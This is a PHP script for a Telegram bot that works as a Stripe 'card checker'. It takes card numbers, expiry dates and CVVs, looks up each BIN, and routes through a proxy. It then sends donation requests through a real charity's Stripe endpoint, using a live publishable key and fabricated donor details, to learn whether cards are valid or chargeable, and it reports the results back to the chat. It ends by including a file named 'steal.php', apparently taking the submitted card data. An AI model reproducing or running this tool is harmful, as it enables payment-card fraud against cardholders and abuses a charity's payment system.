<?php
$start_time = microtime(true);

if ($message == '.str' or $message == '/str' or $message == ',str' or $message == '?str' or $message == '!str') {sendMessage($chatId, "<b>✅𝙶𝚊𝚝𝚎 𝙸𝚗𝚏𝚘: %0A• STRIPE 0.30$ %0A• 𝙾𝚝𝚑𝚎𝚛 𝙶𝚊𝚝𝚎𝚜: /cmds </b>", $message_id);exit();}

include 'Tools/regex.php';
include 'Tools/Antispam.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{sendMessage($chatId, "<b>⚠ [ALERT]PLEASE CHECK THE INPUT FIELDS AND TRY AGAIN</b>", $message_id);exit();}

$i     = explode("|", $lista);
$cc    = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon   = $i[1];
$year  = $i[2];
$cvv   = $i[3];

if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"name":""', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

include 'Tools/proxy.php';

# 01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://crueltyfreeinternational.org/big_stripe/initialise_all/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://crueltyfreeinternational.org',
'referer: https://crueltyfreeinternational.org/donate',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer%5Bname%5D=Jack+Coddrey&customer%5Bemail%5D=abhays32109%40gmail.com&payment%5Bamount%5D=30&address%5Bline1%5D=gardenia+drive+6767&address%5Bline2%5D=&address%5Bcity%5D=San+Jose&address%5Bstate%5D=California&address%5Bpostal_code%5D=92055');
$curl1 = curl_exec($ch);
$pi = trim(strip_tags(getStr($curl1,'client_secret":"','_secret')));
$cs = trim(strip_tags(getStr($curl1,'client_secret":"','"')));

#02. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'/confirm');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'return_url=https%3A%2F%2Fcrueltyfreeinternational.org%2Fthank-you-your-donation&payment_method_data[type]=card&payment_method_data[card][number]='.$c1.'+'.$c2.'+'.$c3.'+'.$c4.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[billing_details][address][postal_code]=92055&payment_method_data[billing_details][address][country]=US&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F2c87e79129%3B+stripe-js-v3%2F2c87e79129%3B+payment-element&payment_method_data[time_on_page]=177383&payment_method_data[guid]=cb4150a6-4629-4ef7-8f8d-626f16236cd7c44df2&payment_method_data[muid]=5e7e6934-cdab-4aa1-9b24-c9bf449c78246027a3&payment_method_data[sid]=92dcf00d-5c4c-4a44-9483-13f8c3e50e9fa08c15&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51IadllLHcm9unoX96OzYCXj7cSU4xitKiz7YeERQFKLDv2GyJbFMLtKhfIw3zQoqUF9BlZgKyCaiJ4iVmSSPPnlq00Y44dZi5L&_stripe_version=2022-08-01&client_secret='.$cs.'');
$curl2 = curl_exec($ch);
$status = trim(strip_tags(getStr($curl2,'status": "','"')));
$dcode = trim(strip_tags(getStr($curl2,'decline_code": "','"')));
$messagee = trim(strip_tags(getStr($curl2,'"message": "','",')));

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);


if (strpos($curl2, "card_error")){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee - $dcode%0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl2, "insufficient_funds")){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ Authorized CVV %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee - $dcode%0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢  $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>𝗧𝗫𝗙𝗡𝗫𝗫 </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl2, 'status": "succeeded')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ Charged Successfully ( $status )%0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl2, "3ds2")){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ Authorized CVV ( 3DS ) %0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif ((strpos($curl2, "intent_confirmation_challenge")) || (strpos($curl4, 'site_key": "'))){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Unchecked Captcha Triggered [ Try Again Later ] %0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif ((strpos($curl2, "parameter_invalid_empty"))){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Please Check The Input Fields And Try Again%0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif ((strpos($curl2, "security code is incorrect")) || (strpos($curl4, "incorrect_cvc"))){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ Authorized CCN %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee%0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif ((strpos($curl2, "error")) || (strpos($curl4, "card_declined")) || (strpos($curl4, "card_decline_rate_limit_exceeded")) || (strpos($curl4, "transaction_not_allowed")) || (strpos($curl4, "incorrect_number")) || (strpos($curl4, "do_not_honor"))){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee - $dcode%0A<b> ━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A 𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
else{
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE 0.30$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee - $dcode%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A%<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
include 'steal.php';
curl_close($ch);
?>